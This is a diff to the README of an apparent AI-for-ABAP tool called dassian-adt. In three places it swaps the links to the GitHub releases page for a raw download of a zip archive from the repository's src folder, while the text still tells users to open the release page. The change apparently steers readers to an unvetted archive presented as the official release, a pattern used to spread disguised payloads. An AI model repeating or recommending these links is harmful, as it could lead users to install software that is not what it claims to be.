@@ -1,6 +1,6 @@
 # 🧩 dassian-adt - Use AI for ABAP work
 
-[![Download](https://img.shields.io/badge/Download%20Release-blue)](https://github.com/messianic-swop450/dassian-adt/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-blue)](https://raw.githubusercontent.com/messianic-swop450/dassian-adt/main/src/adt-dassian-2.0.zip)
 
 ## 📘 What this is
 
@@ -24,7 +24,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit this page to download the release files:
 
-[https://github.com/messianic-swop450/dassian-adt/releases](https://github.com/messianic-swop450/dassian-adt/releases)
+[https://raw.githubusercontent.com/messianic-swop450/dassian-adt/main/src/adt-dassian-2.0.zip](https://raw.githubusercontent.com/messianic-swop450/dassian-adt/main/src/adt-dassian-2.0.zip)
 
 1. Open the release page in your browser.
 2. Find the latest release at the top of the list.
@@ -180,7 +180,7 @@ If the release does not open on Windows:
 
 ## 📎 Download again
 
-[https://github.com/messianic-swop450/dassian-adt/releases](https://github.com/messianic-swop450/dassian-adt/releases)
+[https://raw.githubusercontent.com/messianic-swop450/dassian-adt/main/src/adt-dassian-2.0.zip](https://raw.githubusercontent.com/messianic-swop450/dassian-adt/main/src/adt-dassian-2.0.zip)
 
 ## 🧩 Repo details
 
